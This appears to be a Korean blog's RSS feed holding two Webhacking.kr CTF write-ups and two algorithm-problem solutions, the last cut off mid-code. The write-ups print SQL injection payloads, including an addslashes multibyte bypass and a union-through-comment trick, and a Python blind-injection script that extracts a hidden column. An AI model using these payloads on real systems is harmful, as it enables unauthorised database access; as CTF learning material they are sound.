<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>LRTK Blog</title>
    <link>https://lrtk-coder.github.io/</link>
    
    <atom:link href="https://lrtk-coder.github.io/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description>Coding, Security, IT News 등 정리한 블로그</description>
    <pubDate>Thu, 03 Jun 2021 05:24:05 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>Webhacking.kr Old - 50 Write Up</title>
      <link>https://lrtk-coder.github.io/2021/06/02/Webhacking-kr-Old-50-Write-Up/</link>
      <guid>https://lrtk-coder.github.io/2021/06/02/Webhacking-kr-Old-50-Write-Up/</guid>
      <pubDate>Wed, 02 Jun 2021 20:20:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;Webhacking-kr-Write-Up&quot;&gt;&lt;a href=&quot;#Webhacking-kr-Write-Up&quot; class=&quot;headerlink&quot; title=&quot;Webhacking.kr Write Up&quot;&gt;&lt;/a&gt;Webhacking.kr Write </description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="Webhacking-kr-Write-Up"><a href="#Webhacking-kr-Write-Up" class="headerlink" title="Webhacking.kr Write Up"></a>Webhacking.kr Write Up</h1><h2 id="Old-50"><a href="#Old-50" class="headerlink" title="Old - 50"></a>Old - 50</h2><p><img src="/images/pasted-590.png"><br>SQLi 공격이 문제가 나왔다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($_GET[<span class="string">&#x27;id&#x27;</span>] &amp;&amp; $_GET[<span class="string">&#x27;pw&#x27;</span>])&#123;</span><br><span class="line">$db = dbconnect();</span><br><span class="line">$_GET[<span class="string">&#x27;id&#x27;</span>] = addslashes($_GET[<span class="string">&#x27;id&#x27;</span>]); </span><br><span class="line">$_GET[<span class="string">&#x27;pw&#x27;</span>] = addslashes($_GET[<span class="string">&#x27;pw&#x27;</span>]);</span><br><span class="line">$_GET[<span class="string">&#x27;id&#x27;</span>] = mb_convert_encoding($_GET[<span class="string">&#x27;id&#x27;</span>],<span class="string">&#x27;utf-8&#x27;</span>,<span class="string">&#x27;euc-kr&#x27;</span>);</span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $ck) <span class="keyword">if</span>(preg_match(<span class="string">&quot;/from|pw|\(|\)| |%|=|&gt;|&lt;/i&quot;</span>,$ck)) <span class="keyword">exit</span>();</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/union/i&quot;</span>,$_GET[<span class="string">&#x27;id&#x27;</span>])) <span class="keyword">exit</span>();</span><br><span class="line">$result = mysqli_fetch_array(mysqli_query($db,<span class="string">&quot;select lv from chall50 where id=&#x27;<span class="subst">&#123;$_GET[&#x27;id&#x27;]&#125;</span>&#x27; and pw=md5(&#x27;<span class="subst">&#123;$_GET[&#x27;pw&#x27;]&#125;</span>&#x27;)&quot;</span>));</span><br><span class="line"><span class="keyword">if</span>($result)&#123;</span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">&#x27;lv&#x27;</span>]==<span class="number">1</span>) <span class="keyword">echo</span>(<span class="string">&quot;level : 1&lt;br&gt;&lt;br&gt;&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">&#x27;lv&#x27;</span>]==<span class="number">2</span>) <span class="keyword">echo</span>(<span class="string">&quot;level : 2&lt;br&gt;&lt;br&gt;&quot;</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">if</span>($result[<span class="string">&#x27;lv&#x27;</span>]==<span class="string">&quot;3&quot;</span>) solve(<span class="number">50</span>);</span><br><span class="line"><span class="keyword">if</span>(!$result) <span class="keyword">echo</span>(<span class="string">&quot;Wrong&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>코드를 보니, id와 pw에 대한 검증이 많이 있었다.</p><hr><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ID 검증</span></span><br><span class="line">$_GET[<span class="string">&#x27;id&#x27;</span>] = addslashes($_GET[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">$_GET[<span class="string">&#x27;id&#x27;</span>] = mb_convert_encoding($_GET[<span class="string">&#x27;id&#x27;</span>],<span class="string">&#x27;utf-8&#x27;</span>,<span class="string">&#x27;euc-kr&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/union/i&quot;</span>,$_GET[<span class="string">&#x27;id&#x27;</span>])) <span class="keyword">exit</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment"># PW 검증</span></span><br><span class="line">$_GET[<span class="string">&#x27;pw&#x27;</span>] = addslashes($_GET[<span class="string">&#x27;pw&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment"># ID와 PW 검증</span></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $ck) <span class="keyword">if</span>(preg_match(<span class="string">&quot;/from|pw|\(|\)| |%|=|&gt;|&lt;/i&quot;</span>,$ck)) <span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure><h3 id="ID-검증"><a href="#ID-검증" class="headerlink" title="ID 검증"></a>ID 검증</h3><ul><li>addslashes 함수 : <code>&#39;, &quot;, \, NULL 바이트</code> -&gt; <code>\&#39;, \&quot;, \\, \0\0</code></li><li>preg_match 함수 : <code>union</code></li></ul><p>지금까지는 못봤던, mb_convert_encoding 함수가 보였다.<br><br>해당 <code>mb_convert_encoding($_GET[&#39;id&#39;],&#39;utf-8&#39;,&#39;euc-kr&#39;)</code>은 ID 파라미터 값을 ecu-kr에서 utf-8로 변환시켜준다.</p><h3 id="PW-검증"><a href="#PW-검증" class="headerlink" title="PW 검증"></a>PW 검증</h3><ul><li>addslashes 함수 : <code>&#39;, &quot;, \, NULL 바이트</code> -&gt; <code>\&#39;, \&quot;, \\, \0\0</code></li></ul><h3 id="공통-검증"><a href="#공통-검증" class="headerlink" title="공통 검증"></a>공통 검증</h3><ul><li>preg_match 함수 : <code>from, pw, (, ), 공백, %, =, &gt;, &lt;</code></li></ul><hr><p>위 검증을 우회하여, SQLi 삽입 Lv의 출력을 “3”을 출력해야 Flag를 획득 할 수 있다.</p><p><img src="/images/pasted-591.png"><br>나는 분석을 위해 PHP를 복사하여, SQL 쿼리를 찍어봤다.<br><br>일단 나는 <code>SELCT lv FROM chall50 WHERE id=&#39;guest&#39;#&#39; and pw=md5(&#39;guest&#39;)</code>를 하여, id 파라미터으로만 lv를 출력하는 것을 목표로 잡았다.</p><p>이를 위해 addslashes 함수를 우회하는 방법을 검색해봤다.</p><blockquote><p><a href="https://qhdks.tistory.com/4">addslashes(), mysql_real_escape_string() 우회</a></p></blockquote><p><img src="/images/pasted-592.png"><br>위 블로그에 나온 원리를 이용하여, <code>&#39;</code>를 사용할 수 있지만 guest 뒤에 문자가 생기기 때문에 id 파라미터으로만 lv를 출력하는 것이 안될 것이라 판단이 되었다.<br></p><p><img src="/images/pasted-593.png" alt="id=%a1%27%09or%091%09like%091%23&amp;pw=guest"><br><img src="/images/pasted-594.png"><br>위와 같은 쿼리로 id 파라미터로 1를 출력하였다.<br><br>이제 id에 lv like 3을 삽입하여 시도해봤다.</p><p><img src="/images/pasted-595.png"><br><img src="/images/pasted-596.png"><br>결과는 아무 값도 반환되지 않아서 Wrong이 출력되었다.</p><p><img src="/images/pasted-597.png"><br>직접해보면, 잘 작동이 되는데 이상했다.<br><br>“혹시 DB에 lv의 값이 3인 데이터가 없는 것이 아닐까?”라는 생각으로 이어졌다.</p><p><img src="/images/pasted-598.png"><br>생각을 적중하였다.</p><p>그러다면, Union을 이용하여 Lv의 값을 지정하여 출력을 해야한다.<br><br>Union을 사용하기 위해 id 파라미터는 union에 대한 검증이 있으므로, pw 파라미터를 이용하기로 하였다.</p><p>하지만 md5 함수로 묶어져 있기 때문에 이를 무력화 시켜야 Union를 삽입시킬 수 있을 것 같다.<br><br>그래서 구글에 “PHP SQL Injection 주석”이라고 검색하니, 다양한 SQLi 공격 치트를 정리한 블로그를 발견할 수 있었다.</p><blockquote><p><a href="https://security04.tistory.com/171">IT Security :: SQL Injection 우회 정리</a><br>여기서 주석 부분을 보니, HTML 주석을 이용하여 쿼리문 중간을 주석처리를 하는 것을 볼 수 있었다.<br><br>이를 이용하고자 하였다.</p></blockquote><p><img src="/images/pasted-599.png"><br>이렇게 가운데를 주석처리를 하면, <code>SELECT lv FROM chall50 WHERE id=&#39;?&#39; UNION SELECT 3</code>으로 됨으로 반환값은 3이 나올 것으로 판단이 되었다.</p><p><img src="/images/pasted-600.png" alt="id=%a1%27%2f%2a&amp;pw=%2a%2funion%09select%093%23"><br>내가 생각했던 방법이 맞았는지 Flag를 획득할 수 있었다.</p>]]></content:encoded>
      
      
      <category domain="https://lrtk-coder.github.io/categories/Security/">Security</category>
      
      <category domain="https://lrtk-coder.github.io/categories/Security/Web/">Web</category>
      
      <category domain="https://lrtk-coder.github.io/categories/Security/Web/Webhacking-kr/">Webhacking.kr</category>
      
      
      <category domain="https://lrtk-coder.github.io/tags/Webhacking-kr/">Webhacking.kr</category>
      
      
      <comments>https://lrtk-coder.github.io/2021/06/02/Webhacking-kr-Old-50-Write-Up/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Programmers Level 1 - 실패율</title>
      <link>https://lrtk-coder.github.io/2021/06/02/Programmers-Level-1-%EC%8B%A4%ED%8C%A8%EC%9C%A8/</link>
      <guid>https://lrtk-coder.github.io/2021/06/02/Programmers-Level-1-%EC%8B%A4%ED%8C%A8%EC%9C%A8/</guid>
      <pubDate>Wed, 02 Jun 2021 15:56:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;실패율&quot;&gt;&lt;a href=&quot;#실패율&quot; class=&quot;headerlink&quot; title=&quot;실패율&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://programmers.co.kr/learn/courses/30/lessons/42889&quot;&gt;실패율&lt;/a&gt;&lt;/h</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="실패율"><a href="#실패율" class="headerlink" title="실패율"></a><a href="https://programmers.co.kr/learn/courses/30/lessons/42889">실패율</a></h1><h2 id="문제-설명"><a href="#문제-설명" class="headerlink" title="문제 설명"></a>문제 설명</h2><p><img src="/images/pasted-589.png"><br>슈퍼 게임 개발자 오렐리는 큰 고민에 빠졌다. 그녀가 만든 프랜즈 오천성이 대성공을 거뒀지만, 요즘 신규 사용자의 수가 급감한 것이다. 원인은 신규 사용자와 기존 사용자 사이에 스테이지 차이가 너무 큰 것이 문제였다.</p><p>이 문제를 어떻게 할까 고민 한 그녀는 동적으로 게임 시간을 늘려서 난이도를 조절하기로 했다. 역시 슈퍼 개발자라 대부분의 로직은 쉽게 구현했지만, 실패율을 구하는 부분에서 위기에 빠지고 말았다. 오렐리를 위해 실패율을 구하는 코드를 완성하라.</p><ul><li>실패율은 다음과 같이 정의한다.<ul><li>스테이지에 도달했으나 아직 클리어하지 못한 플레이어의 수 / 스테이지에 도달한 플레이어 수</li></ul></li></ul><p>전체 스테이지의 개수 N, 게임을 이용하는 사용자가 현재 멈춰있는 스테이지의 번호가 담긴 배열 stages가 매개변수로 주어질 때, 실패율이 높은 스테이지부터 내림차순으로 스테이지의 번호가 담겨있는 배열을 return 하도록 solution 함수를 완성하라.</p><h3 id="제한사항"><a href="#제한사항" class="headerlink" title="제한사항"></a>제한사항</h3><ul><li>스테이지의 개수 N은 1 이상 500 이하의 자연수이다.</li><li>stages의 길이는 1 이상 200,000 이하이다.</li><li>stages에는 1 이상 N + 1 이하의 자연수가 담겨있다.<ul><li>각 자연수는 사용자가 현재 도전 중인 스테이지의 번호를 나타낸다.</li><li>단, N + 1 은 마지막 스테이지(N 번째 스테이지) 까지 클리어 한 사용자를 나타낸다.</li></ul></li><li>만약 실패율이 같은 스테이지가 있다면 작은 번호의 스테이지가 먼저 오도록 하면 된다.</li><li>스테이지에 도달한 유저가 없는 경우 해당 스테이지의 실패율은 0 으로 정의한다.</li></ul><h2 id="문제-풀이"><a href="#문제-풀이" class="headerlink" title="문제 풀이"></a>문제 풀이</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solution</span>(<span class="params">N:<span class="built_in">int</span>, stages:<span class="built_in">list</span></span>):</span></span><br><span class="line">    result = &#123;&#125;</span><br><span class="line">    stagesLength = <span class="built_in">len</span>(stages)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> stage <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, N+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> stagesLength != <span class="number">0</span>:</span><br><span class="line">            count = stages.count(stage)</span><br><span class="line">            result[stage] = count/stagesLength</span><br><span class="line">            stagesLength -= count</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[stage] = <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sorted</span>(result, reverse=<span class="literal">True</span>, key=<span class="keyword">lambda</span> x: result[x])</span><br></pre></td></tr></table></figure><p>나는 딕셔너리를 사용하여 값을 저장하였다.<br><br>1~N까지 반복하는하데, 실패율을 검사하는 스테이지의 개수를 구하여, 실패율을 구한 후 <code>전체 길이 - 스테이지의 개수</code>를 한다. 이러면 검사하는 스테이지와 같은 값들은 제거가 되는 것과 같다.</p><p>그 후 전체 길이가 0이면, 0를 삽입한다.</p><p>반복문이 끝났으면, sotred 함수를 이용하여 딕셔너리의 value로 정렬 후 정렬한 딕셔너리의 key를 리턴한다.</p>]]></content:encoded>
      
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/">알고리즘</category>
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%ED%94%84%EB%A1%9C%EA%B7%B8%EB%9E%98%EB%A8%B8%EC%8A%A4/">프로그래머스</category>
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%ED%94%84%EB%A1%9C%EA%B7%B8%EB%9E%98%EB%A8%B8%EC%8A%A4/Level-1/">Level 1</category>
      
      
      <category domain="https://lrtk-coder.github.io/tags/Programmers/">Programmers</category>
      
      <category domain="https://lrtk-coder.github.io/tags/Programmers-Level-1/">Programmers Level 1</category>
      
      <category domain="https://lrtk-coder.github.io/tags/%EA%B5%AC%ED%98%84/">구현</category>
      
      
      <comments>https://lrtk-coder.github.io/2021/06/02/Programmers-Level-1-%EC%8B%A4%ED%8C%A8%EC%9C%A8/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Webhacking.kr Old - 55 Write Up</title>
      <link>https://lrtk-coder.github.io/2021/06/02/Webhacking-kr-Old-55-Write-Up/</link>
      <guid>https://lrtk-coder.github.io/2021/06/02/Webhacking-kr-Old-55-Write-Up/</guid>
      <pubDate>Wed, 02 Jun 2021 04:20:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&lt;img src=&quot;/images/pasted-588.png&quot;&gt;&lt;br&gt;마우스를 따라오는 슬라임이 있는 페이지가 나왔다. 슬라임이 움직이면 Score도 증가가 되었다.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/pasted-587.png&quot;&gt;&lt;br&gt;</description>
        
      
      
      
      <content:encoded><![CDATA[<p><img src="/images/pasted-588.png"><br>마우스를 따라오는 슬라임이 있는 페이지가 나왔다. 슬라임이 움직이면 Score도 증가가 되었다.</p><p><img src="/images/pasted-587.png"><br>랭크 페이지가 있길래 들어가보니, Insert문이 밑에 나와있었다.</p><p>게임이 종료가 된 후 DB에 저장이 될 때, 저 Insert문이 작동되는 것으로 추측이 된다.</p><p><img src="/images/pasted-586.png"><br>Score 부분에도 a태그로 되어 있어서 클릭해보니, 서버에 score 파라미터를 보내고 있었다.</p><p><img src="/images/pasted-585.png"><br>그래서 혹시나 해서 점수 뒤에 작은 따음표를 넣어서 서버로 보내니, ‘no hack’이 출력이 되었다.</p><p>입력값에 대한 검증을 한다는 것을 확인을 하고, 나는 어떤 문자를 검증하는지 확인하였다.</p><p>몇가지 테스트를 해보니, 작음 따음표와 큰 따음표에 ‘no hack’를 출력하였다.</p><p>생각을 해보니, 점수는 INT 타입으로 들어가니 작음 따음표와 큰 따음표가 들어가면 Query Error가 일어났고 ‘no hack’은 Error 대신에 출력되는 것으로 판단이 되었다.</p><p>그래서 or 1=1를 넣어서 SQLi가 되는지 확인을 하였다.</p><p><img src="/images/pasted-584.png"><br>그 결과 출력이 잘 된 것을 볼 수 있었다.</p><p>나는 어떤 SQLi를 써야 먹힐지 고민하는 중에 페이지의 id를 보니, 이상한 점을 볼 수 있었다.</p><p>보통 여러 정보들을 한줄로 나누어 보여줄때, <code>1, 2, 3</code>, <code>1 / 2 / 3</code> 등으로 표시는 해주는데 여기선 //으로 나누고 있다.</p><p>나는 “flag의 자리를 암시하는 것이 아닐까?”라는 생각을 할 수 있었고, 만약 페이지에 표시해주기 위해서는 “<code>SELECT id, flag, score FROM chall55 WHERE score=score파라미터</code>으로 이루어지지 않았을까?”라는 생각으로 이어졌다.</p><p>53번 문제에서 배웠던 procedure analyse 함수를 이용하여 해당 추측이 맞는지 확인을 하였다.</p><p>만약 id, score만 갖고오면 2개의 컬럼만 출력되어야한다.</p><p><img src="/images/pasted-583.png" alt="1 limit 0, 1 procedure analyse()"><br><img src="/images/pasted-582.png" alt="1 limit 1, 2 procedure analyse()"><br>SELECT의 첫번째와 두번째는 id, score로 나왔다. 이제 세번째 컬럼을 요청하여 결과가 나오면 내가 생각한 것이 맞았다는 것이다.</p><p><img src="/images/pasted-581.png" alt="1 limit 2, 3 procedure analyse()"><br>세번째 컬럼도 출력이 되었다. 예상과 다르게 컬럼명이 flag가 아닌 이상한 이름이였다.</p><p>위 정보들을 이용하여 나는 Blind SQLi를 시도할 것이다.</p><p>Length 함수와 Substr 함수를 이용하여 Flag의 길이와 알파벳을 구할 코드를 작성하도록 하겠다.</p><p><img src="/images/pasted-580.png" alt="쿼리문 False: 1 or length(chall55.p4ssw0rd_1123581321)=0"><br><img src="/images/pasted-579.png" alt="쿼리문 True: 1 or 1=1"><br>Flag의 길이가 True가 될 경우, ‘jisu8110 // 895’가 출력될 것이다.</p><p><img src="/images/pasted-578.png" alt="1 or SUBSTR(chall55.p4ssw0rd_1123581321, 0, 1)=0x66"><br>코드를 작성하는 도중 발견할 수 있었다. 서버에선 Substr 함수도 검증을 하고 있어서 사용이 불가능하였다.</p><p>하지만 다양한 방법으로 문자열에 검증을 할 수 있다.</p><p><img src="/images/pasted-577.png" alt="쿼리문 False: 1 or left(p4ssw0rd_1123581321, 1)=0x60"><br><img src="/images/pasted-576.png" alt="쿼리문 True: 1 or left(p4ssw0rd_1123581321, 1)=0x66"><br>Left 함수를 이용한 문자 검증</p><p><img src="/images/pasted-575.png" alt="1 or INSTR(p4ssw0rd_1123581321, 0x60)=1"><br><img src="/images/pasted-573.png" alt="1 or INSTR(p4ssw0rd_1123581321, 0x66)=1"><br>INSTR 함수를 이용한 문자 검증</p><p>둘 다 비슷하게 서버에 아스키코드를 보내줘야하니, 고민 없이 아무거나 골라쓰면 된다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, string</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup <span class="keyword">as</span> bs</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flagLength</span>(<span class="params">url:<span class="built_in">str</span></span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>, <span class="number">100</span>):</span><br><span class="line">        res = requests.get(url + <span class="string">f&quot;1 or length(chall55.p4ssw0rd_1123581321)=<span class="subst">&#123;i&#125;</span>&quot;</span>)</span><br><span class="line">        soup = bs(res.text, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">        result = soup.select(<span class="string">&#x27;center&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> result[<span class="number">0</span>].text[<span class="number">-1</span>] != <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            print(<span class="string">&#x27;Flag Length &gt;&gt;&gt;&#x27;</span>, i)</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flagText</span>(<span class="params">url:<span class="built_in">str</span>, length:<span class="built_in">int</span></span>):</span></span><br><span class="line">    flag = <span class="string">&#x27;flag&#123;&#x27;</span></span><br><span class="line">    flagHex = [<span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="built_in">ord</span>(i))[<span class="number">2</span>:]) <span class="keyword">for</span> i <span class="keyword">in</span> flag]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> string.ascii_lowercase + string.punctuation:</span><br><span class="line">            res = requests.get(url + <span class="string">f&quot;1 or INSTR(chall55.p4ssw0rd_1123581321, 0x<span class="subst">&#123;<span class="string">&#x27;&#x27;</span>.join(flagHex) + <span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="built_in">ord</span>(i))[<span class="number">2</span>:])&#125;</span>)=True&quot;</span>)</span><br><span class="line">            soup = bs(res.text, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">            result = soup.select(<span class="string">&#x27;center&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> result[<span class="number">0</span>].text[<span class="number">-1</span>] != <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">                flag += <span class="built_in">chr</span>(<span class="built_in">ord</span>(i))</span><br><span class="line">                print(<span class="string">&#x27;Flag &gt;&gt;&gt;&#x27;</span>, flag)</span><br><span class="line">                flagHex.append(<span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="built_in">ord</span>(i))[<span class="number">2</span>:]))</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(flag) == length:</span><br><span class="line">            <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    url = <span class="string">&#x27;https://webhacking.kr/challenge/web-31/rank.php?score=&#x27;</span></span><br><span class="line"></span><br><span class="line">    length = flagLength(url)</span><br><span class="line">    flagText(url, length)</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-572.png"><br>이와 같이 Flag를 획득할 수 있다.</p>]]></content:encoded>
      
      
      <category domain="https://lrtk-coder.github.io/categories/Security/">Security</category>
      
      <category domain="https://lrtk-coder.github.io/categories/Security/Web/">Web</category>
      
      <category domain="https://lrtk-coder.github.io/categories/Security/Web/Webhacking-kr/">Webhacking.kr</category>
      
      
      <category domain="https://lrtk-coder.github.io/tags/Webhacking-kr/">Webhacking.kr</category>
      
      
      <comments>https://lrtk-coder.github.io/2021/06/02/Webhacking-kr-Old-55-Write-Up/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Programmers Level 1 - 체육복</title>
      <link>https://lrtk-coder.github.io/2021/06/01/Programmers-Level-1-%EC%B2%B4%EC%9C%A1%EB%B3%B5/</link>
      <guid>https://lrtk-coder.github.io/2021/06/01/Programmers-Level-1-%EC%B2%B4%EC%9C%A1%EB%B3%B5/</guid>
      <pubDate>Tue, 01 Jun 2021 16:41:18 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;체육복&quot;&gt;&lt;a href=&quot;#체육복&quot; class=&quot;headerlink&quot; title=&quot;체육복&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://programmers.co.kr/learn/courses/30/lessons/42862&quot;&gt;체육복&lt;/a&gt;&lt;/h</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="체육복"><a href="#체육복" class="headerlink" title="체육복"></a><a href="https://programmers.co.kr/learn/courses/30/lessons/42862">체육복</a></h1><h2 id="문제-설명"><a href="#문제-설명" class="headerlink" title="문제 설명"></a>문제 설명</h2><p>점심시간에 도둑이 들어, 일부 학생이 체육복을 도난당했습니다. 다행히 여벌 체육복이 있는 학생이 이들에게 체육복을 빌려주려 합니다. 학생들의 번호는 체격 순으로 매겨져 있어, 바로 앞번호의 학생이나 바로 뒷번호의 학생에게만 체육복을 빌려줄 수 있습니다. 예를 들어, 4번 학생은 3번 학생이나 5번 학생에게만 체육복을 빌려줄 수 있습니다. 체육복이 없으면 수업을 들을 수 없기 때문에 체육복을 적절히 빌려 최대한 많은 학생이 체육수업을 들어야 합니다.</p><p>전체 학생의 수 n, 체육복을 도난당한 학생들의 번호가 담긴 배열 lost, 여벌의 체육복을 가져온 학생들의 번호가 담긴 배열 reserve가 매개변수로 주어질 때, 체육수업을 들을 수 있는 학생의 최댓값을 return 하도록 solution 함수를 작성해주세요.</p><h3 id="제한사항"><a href="#제한사항" class="headerlink" title="제한사항"></a>제한사항</h3><ul><li>전체 학생의 수는 2명 이상 30명 이하입니다.</li><li>체육복을 도난당한 학생의 수는 1명 이상 n명 이하이고 중복되는 번호는 없습니다.</li><li>여벌의 체육복을 가져온 학생의 수는 1명 이상 n명 이하이고 중복되는 번호는 없습니다.</li><li>여벌 체육복이 있는 학생만 다른 학생에게 체육복을 빌려줄 수 있습니다.</li><li>여벌 체육복을 가져온 학생이 체육복을 도난당했을 수 있습니다. 이때 이 학생은 체육복을 하나만 도난당했다고 가정하며, 남은 체육복이 하나이기에 다른 학생에게는 체육복을 빌려줄 수 없습니다.</li></ul><h2 id="문제-풀이"><a href="#문제-풀이" class="headerlink" title="문제 풀이"></a>문제 풀이</h2><h3 id="방법1"><a href="#방법1" class="headerlink" title="방법1"></a>방법1</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> copy</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sameValue</span>(<span class="params">lost, reserve</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span>(<span class="built_in">set</span>(lost) - <span class="built_in">set</span>(reserve)), <span class="built_in">list</span>(<span class="built_in">set</span>(reserve) - <span class="built_in">set</span>(lost))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solution</span>(<span class="params">n:<span class="built_in">str</span>, lost:<span class="built_in">list</span>, reserve:<span class="built_in">list</span></span>):</span></span><br><span class="line">    lost, reserve = sameValue(lost, reserve)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> lost == []:</span><br><span class="line">        <span class="keyword">return</span> n</span><br><span class="line">    </span><br><span class="line">    lostDeepCopy = copy.deepcopy(lost)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> lostDeepCopy:</span><br><span class="line">        <span class="keyword">if</span> i<span class="number">-1</span> <span class="keyword">in</span> reserve:</span><br><span class="line">            lost.remove(i)</span><br><span class="line">            reserve.remove(i<span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">elif</span> i+<span class="number">1</span> <span class="keyword">in</span> reserve:</span><br><span class="line">            lost.remove(i)</span><br><span class="line">            reserve.remove(i+<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> n - 